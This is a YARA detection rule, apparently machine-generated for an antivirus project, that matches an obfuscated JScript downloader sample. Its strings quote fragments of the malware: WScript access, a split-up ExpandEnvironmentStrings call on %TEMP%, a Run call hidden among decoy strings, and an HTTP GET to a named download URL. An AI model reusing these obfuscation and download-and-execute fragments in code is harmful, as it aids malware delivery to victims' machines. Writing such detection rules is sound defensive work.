rule sig_20160428_3f6f44a2c6e05137de2e78279d3e0afd {
  meta:
    description = "datamaliciousorder - file 20160428_3f6f44a2c6e05137de2e78279d3e0afd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2ff01dde858016b20e6ce1897a2a6e7b62306f3f34c7e56721822b7f8b6bb476"

  strings:
    $s1  = "function IsaQfeUrfShgYorUfnUqn() {return JiuHjgLxvMmgXgoEkxXah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function EzhPiyCwvGibRcwPhvGvf(NxyGuxPajMhiXvxNytMjc){JiuHjgLxvMmgXgoEkxXah[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EzhPiyCwvGibRcwPhvGvf(NxyGuxPajMhiXvxNytMjc){JiuHjgLxvMmgXgoEkxXah[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function ZuqLxlBioQwyBibWxkYth(AhnCmlEcqCtwDykOblBet, RhhVdmDfhNtdHjtPirGwg){HxjLjmMuhGfmHxaDftQoj = HxjLjmMuhGfmHxaDftQoj * 1; " ascii
    $s5  = "return AhnCmlEcqCtwDykOblBet - RhhVdmDfhNtdHjtPirGwg;};" fullword ascii
    $s6  = "XibAhhEykTspAkcBfzItf[XchHxrAxvUtxCfqRfxZqx](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s7  = "function IsaQfeUrfShgYorUfnUqn() {return JiuHjgLxvMmgXgoEkxXah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "var JiuHjgLxvMmgXgoEkxXah = function NvyNlvHzkLqwDenWseBpt() {return AlhMpcApcDhnGvqKagPje[MnfUazKyjPjrZxkYldZob](\"WScript\"+\"" ascii
    $s9  = "function ZuqLxlBioQwyBibWxkYth(AhnCmlEcqCtwDykOblBet, RhhVdmDfhNtdHjtPirGwg){HxjLjmMuhGfmHxaDftQoj = HxjLjmMuhGfmHxaDftQoj * 1; " ascii
    $s10 = "function FpeYpzQosPppEduNndMpk(){return KttCobOdwCykUarKkuIbj + \"\";};" fullword ascii
    $s11 = "if (XibAhhEykTspAkcBfzItf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function JmjCejQnhYknIdhVgxPul() {return ((UvzDtpRhvDlzDpwWfsMkw == true) && (UvzDtpRhvDlzDpwWfsMkw == JqgJriVcoGwmVgjLncCtz)) ?" ascii
    $s13 = "function JmjCejQnhYknIdhVgxPul() {return ((UvzDtpRhvDlzDpwWfsMkw == true) && (UvzDtpRhvDlzDpwWfsMkw == JqgJriVcoGwmVgjLncCtz)) ?" ascii
    $s14 = "var JiuHjgLxvMmgXgoEkxXah = function NvyNlvHzkLqwDenWseBpt() {return AlhMpcApcDhnGvqKagPje[MnfUazKyjPjrZxkYldZob](\"WScript\"+\"" ascii
    $s15 = "var AlhMpcApcDhnGvqKagPje = this[\"WScript\"];" fullword ascii
    $s16 = "JqgJriVcoGwmVgjLncCtz = true; " fullword ascii
    $s17 = "var JqgJriVcoGwmVgjLncCtz = false;" fullword ascii
    $s18 = "var FhhQqhLbjIfoMyeIusOrn = false;" fullword ascii
    $s19 = "function PmfIsyZgqAmrYfjZcnIfq(){return MnfUazKyjPjrZxkYldZob;};" fullword ascii
    $s20 = "}while (OwhYoaAajBmxZngKnfOwb);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}